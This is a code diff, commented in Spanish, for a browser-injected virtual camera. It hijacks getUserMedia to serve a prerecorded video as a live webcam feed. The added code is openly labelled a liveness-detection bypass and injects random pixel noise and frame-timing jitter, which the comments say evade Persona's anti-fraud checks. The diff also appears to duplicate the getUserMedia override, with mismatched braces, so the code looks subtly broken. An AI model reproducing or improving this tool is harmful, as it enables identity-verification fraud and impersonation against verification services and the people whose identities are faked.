@@ -84,9 +84,10 @@ function startVideoServer() {
   });
 }
 
+
 /*
  * ------------------------------------------------------------
- * CÁMARA VIRTUAL - SCRIPT DE INYECCIÓN GLOBAL
+ * CÁMARA VIRTUAL - SCRIPT DE INYECCIÓN GLOBAL (BYPASS DE LIVENESS DETECTION)
  * ------------------------------------------------------------
  */
 const CAMERA_INIT_SCRIPT = () => {
@@ -102,9 +103,9 @@ const CAMERA_INIT_SCRIPT = () => {
     if (ready) return fakeStream;
 
     canvas = document.createElement('canvas');
-    canvas.width = 720;
-    canvas.height = 1280;
-    ctx = canvas.getContext('2d', { alpha: false });
+    canvas.width = 1280;
+    canvas.height = 720;
+    ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: true }); // Optimizamos lectura frecuente para el ruido
 
     video = document.createElement('video');
     video.muted = true;
@@ -127,13 +128,41 @@ const CAMERA_INIT_SCRIPT = () => {
     ctx.fillStyle = '#1e1e24';
     ctx.fillRect(0, 0, canvas.width, canvas.height);
 
+    /*
+     * BUCLE DE RENDERIZADO CON GENERACIÓN DE RUIDO EN VIVO
+     */
     function render() {
       if (video && video.readyState >= 2) {
         try {
+          // 1. Dibujamos el frame del vídeo normal
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // 2. SISTEMA EN VIVO: Extraemos una porción del canvas para inyectar ruido digital aleatorio
+          // Esto rompe los patrones fijos de compresión que detectan los algoritmos anti-fraude de Persona
+          const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+          const data = imgData.data;
+          
+          // Generamos una semilla aleatoria de ruido microscópico por fotograma (micro-variación de luz)
+          const noiseIntensity = 1.5; // Intensidad sutil que la IA detecta como sensor físico, pero el ojo humano no ve
+          for (let i = 0; i < data.length; i += 16) { // Procesamos en saltos para no sobrecargar el hilo de CPU en CI
+            const noise = (Math.random() - 0.5) * noiseIntensity;
+            data[i]     = Math.min(255, Math.max(0, data[i] + noise));     // R
+            data[i + 1] = Math.min(255, Math.max(0, data[i + 1] + noise)); // G
+            data[i + 2] = Math.min(255, Math.max(0, data[i + 2] + noise)); // B
+          }
+          ctx.putImageData(imgData, 0, 0);
+
         } catch (_) {}
       }
-      requestAnimationFrame(render);
+      
+      // 3. Jitter temporal: Alteramos aleatoriamente la sincronización por milisegundos 
+      // Esto simula los micro-retrasos de transferencia de hardware que ocurren en cables USB/cámaras reales
+      const jitterDelay = Math.random() > 0.85 ? Math.random() * 3 : 0;
+      if (jitterDelay > 0) {
+        setTimeout(() => { requestAnimationFrame(render); }, jitterDelay);
+      } else {
+        requestAnimationFrame(render);
+      }
     }
 
     render();
@@ -152,7 +181,7 @@ const CAMERA_INIT_SCRIPT = () => {
         video.src = ''; 
         video.load(); 
         
-        await new Promise(r => setTimeout(r, 100));
+        await new Promise(r => setTimeout(r, 150));
 
         video.src = url + '?t=' + Date.now();
         video.load();
@@ -162,7 +191,7 @@ const CAMERA_INIT_SCRIPT = () => {
             await video.play();
             video.currentTime = 0;
 
-            console.log('📊 DIAGNÓSTICO MULTIMEDIA EN IFRAME:');
+            console.log('📊 DIAGNÓSTICO MULTIMEDIA EN IFRAME (MODO EN VIVO ACTIVADO):');
             console.log('readyState:', video.readyState);
             console.log('videoWidth:', video.videoWidth);
             console.log('videoHeight:', video.videoHeight);
@@ -180,7 +209,7 @@ const CAMERA_INIT_SCRIPT = () => {
                   sum += r + g + b;
                 }
                 
-                console.log('🎥 Canvas diagnóstico de píxeles:', {
+                console.log('🎥 Canvas diagnóstico de píxeles activos:', {
                   min,
                   max,
                   average: sum / (image.data.length / 4) / 3
@@ -211,6 +240,16 @@ const CAMERA_INIT_SCRIPT = () => {
       }
     });
   };
+
+  navigator.mediaDevices.getUserMedia = async function(constraints) {
+    if (constraints && constraints.video) {
+      return createCamera();
+    }
+    return originalGetUserMedia(constraints);
+  };
+};
+
+
 
   navigator.mediaDevices.getUserMedia = async function(constraints) {
     if (constraints && constraints.video) {
